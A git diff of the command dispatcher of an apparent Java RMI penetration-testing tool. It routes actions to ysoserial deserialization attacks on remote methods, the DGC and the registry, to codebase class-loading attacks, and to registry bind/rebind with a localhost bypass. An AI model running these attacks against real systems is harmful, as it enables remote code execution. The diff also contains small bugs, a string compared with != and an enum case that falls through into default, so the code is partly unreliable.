@@ -42,33 +42,7 @@ public class Starter {
 
         if( parser.getArgumentCount() >= 3 ) {
             action = parser.getPositionalString(2);
-
-            if( action.matches("attack|codebase|dgc|reg")) {
-                parser.checkArgumentCount(5);
-
-                if(action.equals("codebase") && !commandLine.hasOption("signature")) {
-                    Logger.eprintlnMixedBlue("The", "--signature", "option is required for codebase mode.");
-                    Logger.eprintlnMixedYellow("You need either specify a", "valid function signature", "or ");
-                    Logger.eprintMixedYellow("use", "--signature dgc", "or ");
-                    Logger.printlnPlainMixedYellowFirst("--signature reg", "to target the DGC or the registry directly.");
-                    RMGUtils.exit();
-                }
-            }
-
-            if( action.equals("codebase")) {
-                String serverAddress = parser.getPositionalString(3);
-
-                if( !serverAddress.matches("^(https?|ftp|file)://.*$") )
-                    serverAddress = "http://" + serverAddress;
-
-                if( !serverAddress.matches("^.+(.class|.jar|/)$") )
-                    serverAddress += "/";
-
-                System.setProperty("java.rmi.server.codebase", serverAddress);
-            }
-
-            if( action.equals("bypass") )
-                parser.checkArgumentCount(4);
+            parser.prepareAction(action);
         }
 
         Properties config = new Properties();
@@ -86,8 +60,9 @@ public class Starter {
         String templateFolder = commandLine.getOptionValue("template-folder", config.getProperty("template-folder"));
         String wordlistFolder = commandLine.getOptionValue("wordlist-folder", config.getProperty("wordlist-folder"));
         String ysoserialPath = commandLine.getOptionValue("yso", config.getProperty("ysoserial-path"));
-        String functionSignature = commandLine.getOptionValue("signature", null);
+        String functionSignature = commandLine.getOptionValue("signature", "");
         String boundName = commandLine.getOptionValue("bound-name", null);
+        String regMethod = commandLine.getOptionValue("reg-method", "lookup");
 
         Logger.verbose = !commandLine.hasOption("json");
         boolean sslValue = commandLine.hasOption("ssl");
@@ -95,7 +70,7 @@ public class Starter {
         boolean updateWordlists = commandLine.hasOption("update");
         boolean createSamples = commandLine.hasOption("create-samples");
         boolean zeroArg = commandLine.hasOption("zero-arg");
-        boolean local = commandLine.hasOption("local");
+        boolean localhostBypass = commandLine.hasOption("localhost-bypass");
 
         if( commandLine.hasOption("no-color") ) {
             Logger.disableColor();
@@ -105,7 +80,6 @@ public class Starter {
         RMIWhisperer rmi = new RMIWhisperer(host, port, sslValue, followRedirect);
 
         RMGUtils.init();
-        RMGUtils.enableCodebase();
         RMGUtils.disableWarning();
         RMGUtils.showStackTrace(commandLine.hasOption("stack-trace"));
 
@@ -113,7 +87,11 @@ public class Starter {
         HashMap<String,String> allClasses = null;
         ArrayList<HashMap<String,String>> boundClasses = null;
 
-        if( !action.matches("dgc|bypass|reg") ) {
+        if( !action.matches("bind|dgc|rebind|reg|unbind") && !functionSignature.matches("reg|dgc")) {
+
+            if(action.matches("enum"))
+                RMGUtils.enableCodebase();
+
             rmi.locateRegistry();
 
             boundNames = rmi.getBoundNames(boundName);
@@ -124,7 +102,7 @@ public class Starter {
         }
 
         MethodCandidate candidate = null;
-        if( functionSignature != null && !functionSignature.matches("reg|dgc") ) {
+        if( functionSignature != "" && !functionSignature.matches("reg|dgc") ) {
 
             try {
                 candidate = new MethodCandidate(functionSignature);
@@ -137,6 +115,35 @@ public class Starter {
         }
 
         switch( action ) {
+
+            case "bind":
+            case "rebind":
+                String bName = parser.getPositionalString(3);
+                String listener = parser.getPositionalString(4);
+                String[] split = listener.split(":");
+
+                if( split.length != 2 || !split[1].matches("\\d+") ) {
+                    Logger.eprintlnMixedYellow("Listener must be specified as", "host:port");
+                    RMGUtils.exit();
+                }
+
+                String listenerHost = split[0];
+                int listenerPort = Integer.valueOf(split[1]);
+
+                RegistryClient reg = new RegistryClient(rmi);
+                if(action.equals("bind"))
+                    reg.bindObject(bName, listenerHost, listenerPort, localhostBypass);
+                else
+                    reg.rebindObject(bName, listenerHost, listenerPort, localhostBypass);
+                break;
+
+
+            case "unbind":
+                bName = parser.getPositionalString(3);
+                reg = new RegistryClient(rmi);
+                reg.unbindObject(bName, localhostBypass);
+                break;
+
 
             case "guess":
                 if( !RMGUtils.containsUnknown(boundClasses.get(1)) )
@@ -202,7 +209,8 @@ public class Starter {
                 Logger.decreaseIndent();
                 break;
 
-            case "attack":
+
+            case "method":
             case "dgc":
             case "reg":
 
@@ -218,18 +226,19 @@ public class Starter {
 
                 Object payload = RMGUtils.getPayloadObject(ysoserialPath, gadget, command);
 
-                if( action.equals("attack") ) {
+                if( action.equals("method") ) {
                     MethodAttacker attacker = new MethodAttacker(rmi, allClasses, candidate);
                     attacker.attack(payload, boundName, argumentPos, "ysoserial", legacyMode);
                 } else if( action.equals("dgc" )) {
                     DGCClient dgc = new DGCClient(rmi);
                     dgc.attackCleanCall(payload);
                 } else {
-                    RegistryClient reg = new RegistryClient(rmi);
-                    reg.gadgetCall(payload, local);
+                    reg = new RegistryClient(rmi);
+                    reg.gadgetCall(payload, regMethod, localhostBypass);
                 }
 
                 break;
+
 
             case "codebase":
 
@@ -254,38 +263,11 @@ public class Starter {
                     DGCClient dgc = new DGCClient(rmi);
                     dgc.codebaseCleanCall(payload);
                 } else if( functionSignature.matches("reg") ) {
-                    RegistryClient reg = new RegistryClient(rmi);
-                    reg.codebaseCall(payload, local);
+                    reg = new RegistryClient(rmi);
+                    reg.codebaseCall(payload, regMethod, localhostBypass);
                 }
 
                 break;
-
-            case "bypass":
-
-                String listener = parser.getPositionalString(3);
-                String[] split = listener.split(":");
-
-                if( split.length != 2 || !split[1].matches("\\d+") ) {
-                    Logger.eprintlnMixedYellow("Listener must be specified as", "host:port");
-                    RMGUtils.exit();
-                }
-
-                String listenerHost = split[0];
-                int listenerPort = Integer.valueOf(split[1]);
-
-                Logger.printlnBlue("Attempting RMI deserialization filter bypass.");
-                Logger.printlnMixedBlue("Successful bypass will trigger an outbout connection to", listenerHost + ":" + listenerPort);
-                Logger.println("");
-                Logger.increaseIndent();
-
-                RegistryClient registryClient = new RegistryClient(rmi);
-                registryClient.invokeAnTrinhBypass(listenerHost, listenerPort, local);
-
-                break;
-
-            default:
-                Logger.printlnMixedYellow("Unknown action:", action, ".");
-                Logger.printlnMixedBlue("Performing default action:", "enum");
 
             case "enum":
                 Logger.println("");
@@ -295,11 +277,14 @@ public class Starter {
                 format.listCodeases();
 
                 Logger.println("");
-                registryClient = new RegistryClient(rmi);
+                RegistryClient registryClient = new RegistryClient(rmi);
                 boolean marshal = registryClient.enumerateStringMarshalling();
 
                 Logger.println("");
-                registryClient.enumCodebase(marshal);
+                registryClient.enumCodebase(marshal, regMethod, localhostBypass);
+
+                Logger.println("");
+                registryClient.enumLocalhostBypass();
 
                 Logger.println("");
                 DGCClient dgc = new DGCClient(rmi);
@@ -307,6 +292,10 @@ public class Starter {
 
                 Logger.println("");
                 dgc.enumJEP290();
+
+            default:
+                Logger.printlnPlainMixedYellow("Unknown action:", action);
+                parser.printHelp();
         }
     }
 }
